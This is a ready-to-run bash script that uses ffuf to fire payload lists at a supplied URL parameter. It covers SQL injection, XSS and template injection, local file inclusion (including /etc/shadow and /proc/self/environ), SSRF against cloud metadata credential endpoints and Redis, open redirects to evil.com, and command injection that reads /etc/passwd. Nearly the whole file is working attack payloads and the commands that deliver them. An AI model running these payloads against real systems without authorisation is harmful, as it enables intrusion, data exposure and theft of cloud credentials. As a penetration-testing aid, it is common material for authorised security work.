#!/usr/bin/env bash
# ============================================================
# fuzz-params.sh — Fuzz URL parameters for common vulnerabilities
# ============================================================
# Usage:  ./fuzz-params.sh <url_with_FUZZ>
# Example: ./fuzz-params.sh "https://target.com/page?id=FUZZ"
#
# Tests: SQLi, XSS, SSRF, LFI, Open Redirect, Command Injection
# ============================================================

set -euo pipefail

[[ $# -lt 1 ]] && { echo "Usage: $0 <url_with_FUZZ>"; echo 'Example: $0 "https://target.com/page?id=FUZZ"'; exit 1; }

URL="$1"
OUTDIR="./fuzz-$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "${GREEN}[+]${NC} $1"; }

# ---- SQLi Payloads ----
echo -e "\n${CYAN}=== Testing SQL Injection ===${NC}"
SQLI_PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' UNION SELECT NULL--"
    "1' ORDER BY 1--"
    "1' ORDER BY 10--"
    "1 AND 1=1"
    "1 AND 1=2"
    "1' AND '1'='1"
    "1' AND '1'='2"
    "admin'--"
    "1; WAITFOR DELAY '0:0:5'--"
    "1' AND SLEEP(5)--"
    "' OR 1=1#"
)

printf '%s\n' "${SQLI_PAYLOADS[@]}" > "$OUTDIR/sqli_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/sqli_payloads.txt" -mc all -fc 400 -fr "error in your SQL" -o "$OUTDIR/sqli_results.json" -of json -s 2>/dev/null
log "SQLi payloads tested: ${#SQLI_PAYLOADS[@]}"

# ---- XSS Payloads ----
echo -e "\n${CYAN}=== Testing XSS ===${NC}"
XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '"><script>alert(1)</script>'
    "'><script>alert(1)</script>"
    '<img src=x onerror=alert(1)>'
    '<svg/onload=alert(1)>'
    '"><img src=x onerror=alert(1)>'
    'javascript:alert(1)'
    '"><svg/onload=alert(1)>'
    '<details open ontoggle=alert(1)>'
    "-alert(1)-"
    "{{7*7}}"
    "${7*7}"
    "<%= 7*7 %>"
)

printf '%s\n' "${XSS_PAYLOADS[@]}" > "$OUTDIR/xss_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/xss_payloads.txt" -mc all -fc 400 -o "$OUTDIR/xss_results.json" -of json -s 2>/dev/null
log "XSS payloads tested: ${#XSS_PAYLOADS[@]}"

# ---- LFI Payloads ----
echo -e "\n${CYAN}=== Testing LFI ===${NC}"
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc/passwd"
    "/etc/passwd"
    "file:///etc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/convert.base64-encode/resource=index.php"
    "../../../etc/shadow"
    "../../../windows/system32/drivers/etc/hosts"
    "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
    "/proc/self/environ"
    "/proc/self/cmdline"
    "expect://id"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"
)

printf '%s\n' "${LFI_PAYLOADS[@]}" > "$OUTDIR/lfi_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/lfi_payloads.txt" -mc all -fc 400 -fr "root:x:" -o "$OUTDIR/lfi_results.json" -of json -s 2>/dev/null
log "LFI payloads tested: ${#LFI_PAYLOADS[@]}"

# ---- SSRF Payloads ----
echo -e "\n${CYAN}=== Testing SSRF ===${NC}"
SSRF_PAYLOADS=(
    "http://127.0.0.1"
    "http://localhost"
    "http://0.0.0.0"
    "http://[::1]"
    "http://169.254.169.254"
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://100.100.100.200/latest/meta-data/"
    "http://169.254.170.2/v2/metadata"
    "file:///etc/passwd"
    "dict://127.0.0.1:6379/"
    "gopher://127.0.0.1:6379/_INFO"
    "http://0177.0.0.1"
    "http://0x7f.0x00.0x00.0x01"
)

printf '%s\n' "${SSRF_PAYLOADS[@]}" > "$OUTDIR/ssrf_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/ssrf_payloads.txt" -mc all -fc 400 -o "$OUTDIR/ssrf_results.json" -of json -s 2>/dev/null
log "SSRF payloads tested: ${#SSRF_PAYLOADS[@]}"

# ---- Open Redirect ----
echo -e "\n${CYAN}=== Testing Open Redirect ===${NC}"
REDIRECT_PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "/\\evil.com"
    "https://evil.com%00.target.com"
    "//evil.com/%2f.."
    "///evil.com"
    "////evil.com"
    "https:evil.com"
    "https://evil.com%23.target.com"
    "javascript:alert(document.domain)"
    "//google.com"
    "///google.com"
    "/google.com"
)

printf '%s\n' "${REDIRECT_PAYLOADS[@]}" > "$OUTDIR/redirect_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/redirect_payloads.txt" -mc all -fc 400 -o "$OUTDIR/redirect_results.json" -of json -s 2>/dev/null
log "Open Redirect payloads tested: ${#REDIRECT_PAYLOADS[@]}"

# ---- Command Injection (blind) ----
echo -e "\n${CYAN}=== Testing Command Injection (blind) ===${NC}"
CMD_PAYLOADS=(
    "; id"
    "| id"
    "\`id\`"
    '$(id)'
    "; sleep 5"
    "| sleep 5"
    '$(sleep 5)'
    '`sleep 5`'
    "|| ping -c 5 127.0.0.1"
    "& ping -c 5 127.0.0.1"
    "| cat /etc/passwd"
    "; cat /etc/passwd"
    "%0aid"
    "%0a id"
)

printf '%s\n' "${CMD_PAYLOADS[@]}" > "$OUTDIR/cmd_payloads.txt"
ffuf -u "$URL" -w "$OUTDIR/cmd_payloads.txt" -mc all -fc 400 -o "$OUTDIR/cmd_results.json" -of json -s 2>/dev/null
log "Command Injection payloads tested: ${#CMD_PAYLOADS[@]}"

# ---- Summary ----
echo -e "\n${CYAN}=== Scan Complete ===${NC}"
echo "  Output directory: $OUTDIR"
echo "  Files:"
ls -la "$OUTDIR"/*.json 2>/dev/null | awk '{print "    " $NF " (" $5 " bytes)"}'
echo ""
echo "  Review results:"
echo "    cat $OUTDIR/sqli_results.json | jq '.results[] | {url, status, length}'"
